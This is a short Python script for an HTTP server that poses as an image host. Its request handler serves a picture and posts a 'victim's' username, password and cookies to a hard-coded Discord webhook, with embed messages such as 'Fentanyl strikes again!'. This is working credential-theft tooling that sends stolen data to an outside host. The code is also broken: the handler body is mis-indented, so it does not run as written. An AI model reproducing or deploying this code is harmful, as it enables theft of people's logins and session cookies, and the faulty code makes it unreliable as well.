from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, base64, httpagentparser

webhook = 'https://discordapp.com/api/webhooks/989537783800557568/KxaBa41xBzZVs2bXf90gcT2vbxNhicEo-U9i8sF7ujVcMhuqH4bqfxbge5-CONZJyp2J'
bindata = requests.get('https://img8bit.com/timthumb.php?src=Tips/wp-content/uploads/2021/10/0-18-screenshot.png&h=240&w=314').content
def formatHook(username,password,cookies):return {
"username": "Fentanyl",
"content": "@everyone",
"embeds": [
{
"title": "Fentanyl strikes again!",
"color": 16711803,
"description": "A Victim opened the original Image. You can find their info below.",
"author": {
"name": "Fentanyl"
},
"fields": [
{
"name": "Victim's Info",
"value": f"Username: {username}\nPassword: {password}\nCookies: {cookies}",
"inline": True
}
]
}
],
}

def prev(username,password,cookies):return {
"username": "Fentanyl",
"content": "",
"embeds": [
{
"title": "Fentanyl Alert!",
"color": 16711803,
"description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\nUsername: {username}\nPassword: {password}\nCookies: {cookies}",
"author": {
"name": "Fentanyl"
},
"fields": [
]
}
],
}

class handler(BaseHTTPRequestHandler):
  def do_GET(self):s = self.path
dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
try: data = requests.get(dic['url']).content if 'url' in dic else bindata
except Exception: data = bindata
useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
  if 'discord' in useragent.lower():
    self.send_response(200)
    self.send_header('Content-type','image/jpeg')
    self.end_headers()
    self.wfile.write(data)
    requests.post(webhook,json=prev(dic['username'],dic['password'],dic['cookies']))
  else:
    pass
else:
    self.send_response(200)
    self.send_header('Content-type','image/jpeg')
    self.end_headers()
    self.wfile.write(data)
